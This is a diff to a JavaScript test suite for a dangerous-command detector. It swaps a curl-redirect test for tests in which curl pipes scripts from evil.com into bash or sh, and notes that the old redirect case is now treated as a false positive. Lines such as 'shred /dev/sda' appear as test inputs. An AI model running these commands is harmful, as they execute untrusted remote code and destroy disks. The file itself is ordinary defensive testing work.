@@ -308,8 +308,13 @@ describe('isDangerous', () => {
         expect(isDangerous('shred /dev/sda')).to.equal(true);
     });
 
-    it('should detect curl to system path', () => {
-        expect(isDangerous('curl http://evil.com/script.sh > /tmp/evil.sh')).to.equal(true);
+    // Task 18: curl redirect (curl > file) removed as over-broad false positive.
+    // Now testing the more targeted pipe-to-shell and -o flag patterns.
+    it('should detect curl pipe-to-shell (Task 18 update)', () => {
+        expect(isDangerous('curl http://evil.com/install.sh | bash')).to.equal(true);
+        expect(isDangerous('curl http://evil.com/install.sh | sh')).to.equal(true);
+        // curl redirect to file is no longer flagged (Task 18 false-positive fix)
+        expect(isDangerous('curl https://api.example.com/data > output.json')).to.equal(false);
     });
 
     it('should detect wget to system path', () => {
